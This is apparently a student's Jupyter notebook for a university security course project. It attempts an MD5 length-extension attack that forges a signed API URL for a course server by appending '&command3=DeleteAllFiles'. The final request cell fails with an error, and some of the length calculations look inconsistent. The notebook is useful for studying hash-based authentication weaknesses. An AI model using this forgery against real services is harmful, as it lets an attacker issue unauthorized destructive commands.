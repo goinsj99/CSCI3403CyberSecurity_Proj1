{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import http.client \n",
    "import urllib.parse \n",
    "import sys\n",
    "import pymd5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "a65a3aace0f53e7931b0ff69a71a3d42\n"
     ]
    }
   ],
   "source": [
    "from pymd5 import md5, padding\n",
    "original_url = b'https://csci3403.com/proj1/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp'\n",
    "h = md5()\n",
    "h.update(original_url)\n",
    "print(h.hexdigest())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "original_token = 'a65a3aace0f53e7931b0ff69a71a3d42'\n",
    "length_of_url = len(original_url) + 8\n",
    "url_pad = pymd5.padding(length_of_url * 8)\n",
    "total_len = (length_of_url + len(url_pad)) * 8\n",
    "h = pymd5.md5(state=bytes.fromhex(original_token), count=total_len)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'https://csci3403.com/proj1/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&co mmand1=ListFiles&command2=NoOp\\x80\\x00\\x00\\x00\\x00\\x00\\x90\\x03\\x00\\x00\\x00\\x00\\x00\\x00&command3=DeleteAllFiles'\n"
     ]
    }
   ],
   "source": [
    "suffix = '&command3=DeleteAllFiles'\n",
    "h.update(suffix.encode())\n",
    "updated_url = h.hexdigest()\n",
    "new_url = original_url + padding(len(original_url)*8)+ suffix.encode()\n",
    "print (original_url + padding(len(original_url)*8)+ suffix.encode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "ename": "UnicodeDecodeError",
     "evalue": "'ascii' codec can't decode byte 0x80 in position 0: ordinal not in range(128)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mUnicodeDecodeError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[1;32m/Users/iiicemane/Desktop/cyberSecurity/CSCI3403_Proj1/solutions_1.ipynb Cell 8'\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> <a href='vscode-notebook-cell:/Users/iiicemane/Desktop/cyberSecurity/CSCI3403_Proj1/solutions_1.ipynb#ch0000007?line=0'>1</a>\u001b[0m parsed_url \u001b[39m=\u001b[39m urllib\u001b[39m.\u001b[39;49mparse\u001b[39m.\u001b[39;49murlparse(url_pad)\n\u001b[1;32m      <a href='vscode-notebook-cell:/Users/iiicemane/Desktop/cyberSecurity/CSCI3403_Proj1/solutions_1.ipynb#ch0000007?line=1'>2</a>\u001b[0m conn \u001b[39m=\u001b[39m http\u001b[39m.\u001b[39mclient\u001b[39m.\u001b[39mHTTPSConnection(parsed_url\u001b[39m.\u001b[39mhostname, parsed_url\u001b[39m.\u001b[39mport)\n\u001b[1;32m      <a href='vscode-notebook-cell:/Users/iiicemane/Desktop/cyberSecurity/CSCI3403_Proj1/solutions_1.ipynb#ch0000007?line=2'>3</a>\u001b[0m conn\u001b[39m.\u001b[39mrequest(\u001b[39m\"\u001b[39m\u001b[39mGET\u001b[39m\u001b[39m\"\u001b[39m, parsed_url\u001b[39m.\u001b[39mpath \u001b[39m+\u001b[39m \u001b[39m\"\u001b[39m\u001b[39m?\u001b[39m\u001b[39m\"\u001b[39m \u001b[39m+\u001b[39m parsed_url\u001b[39m.\u001b[39mquery)\n",
      "File \u001b[0;32m/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py:372\u001b[0m, in \u001b[0;36murlparse\u001b[0;34m(url, scheme, allow_fragments)\u001b[0m\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=365'>366</a>\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39murlparse\u001b[39m(url, scheme\u001b[39m=\u001b[39m\u001b[39m'\u001b[39m\u001b[39m'\u001b[39m, allow_fragments\u001b[39m=\u001b[39m\u001b[39mTrue\u001b[39;00m):\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=366'>367</a>\u001b[0m     \u001b[39m\"\"\"Parse a URL into 6 components:\u001b[39;00m\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=367'>368</a>\u001b[0m \u001b[39m    <scheme>://<netloc>/<path>;<params>?<query>#<fragment>\u001b[39;00m\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=368'>369</a>\u001b[0m \u001b[39m    Return a 6-tuple: (scheme, netloc, path, params, query, fragment).\u001b[39;00m\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=369'>370</a>\u001b[0m \u001b[39m    Note that we don't break the components up in smaller bits\u001b[39;00m\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=370'>371</a>\u001b[0m \u001b[39m    (e.g. netloc is a single string) and we don't expand % escapes.\"\"\"\u001b[39;00m\n\u001b[0;32m--> <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=371'>372</a>\u001b[0m     url, scheme, _coerce_result \u001b[39m=\u001b[39m _coerce_args(url, scheme)\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=372'>373</a>\u001b[0m     splitresult \u001b[39m=\u001b[39m urlsplit(url, scheme, allow_fragments)\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=373'>374</a>\u001b[0m     scheme, netloc, url, query, fragment \u001b[39m=\u001b[39m splitresult\n",
      "File \u001b[0;32m/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py:124\u001b[0m, in \u001b[0;36m_coerce_args\u001b[0;34m(*args)\u001b[0m\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=121'>122</a>\u001b[0m \u001b[39mif\u001b[39;00m str_input:\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=122'>123</a>\u001b[0m     \u001b[39mreturn\u001b[39;00m args \u001b[39m+\u001b[39m (_noop,)\n\u001b[0;32m--> <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=123'>124</a>\u001b[0m \u001b[39mreturn\u001b[39;00m _decode_args(args) \u001b[39m+\u001b[39m (_encode_result,)\n",
      "File \u001b[0;32m/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py:108\u001b[0m, in \u001b[0;36m_decode_args\u001b[0;34m(args, encoding, errors)\u001b[0m\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=105'>106</a>\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39m_decode_args\u001b[39m(args, encoding\u001b[39m=\u001b[39m_implicit_encoding,\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=106'>107</a>\u001b[0m                        errors\u001b[39m=\u001b[39m_implicit_errors):\n\u001b[0;32m--> <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=107'>108</a>\u001b[0m     \u001b[39mreturn\u001b[39;00m \u001b[39mtuple\u001b[39;49m(x\u001b[39m.\u001b[39;49mdecode(encoding, errors) \u001b[39mif\u001b[39;49;00m x \u001b[39melse\u001b[39;49;00m \u001b[39m'\u001b[39;49m\u001b[39m'\u001b[39;49m \u001b[39mfor\u001b[39;49;00m x \u001b[39min\u001b[39;49;00m args)\n",
      "File \u001b[0;32m/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py:108\u001b[0m, in \u001b[0;36m<genexpr>\u001b[0;34m(.0)\u001b[0m\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=105'>106</a>\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39m_decode_args\u001b[39m(args, encoding\u001b[39m=\u001b[39m_implicit_encoding,\n\u001b[1;32m    <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=106'>107</a>\u001b[0m                        errors\u001b[39m=\u001b[39m_implicit_errors):\n\u001b[0;32m--> <a href='file:///Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/urllib/parse.py?line=107'>108</a>\u001b[0m     \u001b[39mreturn\u001b[39;00m \u001b[39mtuple\u001b[39m(x\u001b[39m.\u001b[39;49mdecode(encoding, errors) \u001b[39mif\u001b[39;00m x \u001b[39melse\u001b[39;00m \u001b[39m'\u001b[39m\u001b[39m'\u001b[39m \u001b[39mfor\u001b[39;00m x \u001b[39min\u001b[39;00m args)\n",
      "\u001b[0;31mUnicodeDecodeError\u001b[0m: 'ascii' codec can't decode byte 0x80 in position 0: ordinal not in range(128)"
     ]
    }
   ],
   "source": [
    "\n",
    "parsed_url = urllib.parse.urlparse(url_pad)\n",
    "conn = http.client.HTTPSConnection(parsed_url.hostname, parsed_url.port)\n",
    "conn.request(\"GET\", parsed_url.path + \"?\" + parsed_url.query)\n",
    "print(conn.getresponse().read())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
